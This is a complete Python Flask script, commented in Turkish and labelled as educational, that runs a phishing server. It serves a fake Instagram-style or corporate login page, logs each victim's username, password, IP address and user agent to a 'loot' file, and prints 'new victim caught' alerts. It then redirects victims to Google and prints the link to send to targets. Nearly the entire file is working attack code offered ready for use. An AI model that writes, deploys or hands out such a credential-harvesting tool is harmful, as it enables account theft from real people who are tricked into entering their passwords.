#!/usr/bin/env python3
"""
Phishing Server (Eğitim Amaçlı)
===============================
Sahte bir login sayfası başlatır ve girilen şifreleri kaydeder.
Gereksinim: pip install flask
"""
import sys
import os
import logging
from datetime import datetime
try:
    from flask import Flask, request, render_template_string, redirect
except ImportError:
    print("[-] 'flask' kütüphanesi eksik. Kurulum: pip install flask")
    sys.exit(1)

app = Flask(__name__)
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR) # Sadece hataları göster

# Basit bir Instagram benzeri veya Şirket giriş sayfası şablonu
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Giriş Yap</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-container { background-color: white; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; }
        h1 { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; font-size: 32px; margin-bottom: 30px; color: #262626; }
        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; border-radius: 3px; box-sizing: border-box; background-color: #fafafa; }
        button { width: 100%; padding: 10px; background-color: #0095f6; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
        button:hover { background-color: #0081d6; }
        .error { color: red; font-size: 14px; margin-bottom: 10px; display: {% if error %}block{% else %}none{% endif %}; }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>{{ title }}</h1>
        <p style="color: #8e8e8e; font-size: 14px; margin-bottom: 20px;">Devam etmek için lütfen giriş yapın.</p>
        <div class="error">Kullanıcı adı veya şifre hatalı. Lütfen tekrar deneyin.</div>
        <form method="POST" action="/">
            <input type="text" name="username" placeholder="Kullanıcı Adı veya E-Posta" required>
            <input type="password" name="password" placeholder="Şifre" required>
            <button type="submit">Giriş Yap</button>
        </form>
    </div>
</body>
</html>
"""

loot_file = "phishing_loot.txt"
redirect_url = "https://www.google.com"
page_title = "Kurumsal Portal"

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        ip_addr = request.remote_addr
        user_agent = request.headers.get('User-Agent')
        
        print(f"\n[\033[91m!\033[0m] \033[92mYENİ KURBAN YAKALANDI!\033[0m")
        print(f"  -> IP   : {ip_addr}")
        print(f"  -> User : {username}")
        print(f"  -> Pass : {password}")
        
        with open(loot_file, "a", encoding="utf-8") as f:
            f.write(f"[{datetime.now()}] IP: {ip_addr} | User: {username} | Pass: {password} | UA: {user_agent}\n")
            
        return redirect(redirect_url)
        
    return render_template_string(HTML_TEMPLATE, title=page_title, error=request.args.get('error'))

if __name__ == "__main__":
    print("\n\033[93m[*] Phishing Server Başlatılıyor...\033[0m")
    
    if len(sys.argv) > 1:
        port = int(sys.argv[1])
    else:
        port = 8080
        
    if len(sys.argv) > 2:
        redirect_url = sys.argv[2]
        
    if len(sys.argv) > 3:
        page_title = sys.argv[3]

    print(f"\033[96m[+] Dinlenen Port  :\033[0m {port}")
    print(f"\033[96m[+] Yönlendirme    :\033[0m {redirect_url}")
    print(f"\033[96m[+] Sayfa Başlığı  :\033[0m {page_title}")
    print(f"\033[92m[*] Hedefe Gönderilecek Link: http://<Senin-IP-Adresin>:{port}/\033[0m\n")
    
    app.run(host="0.0.0.0", port=port)
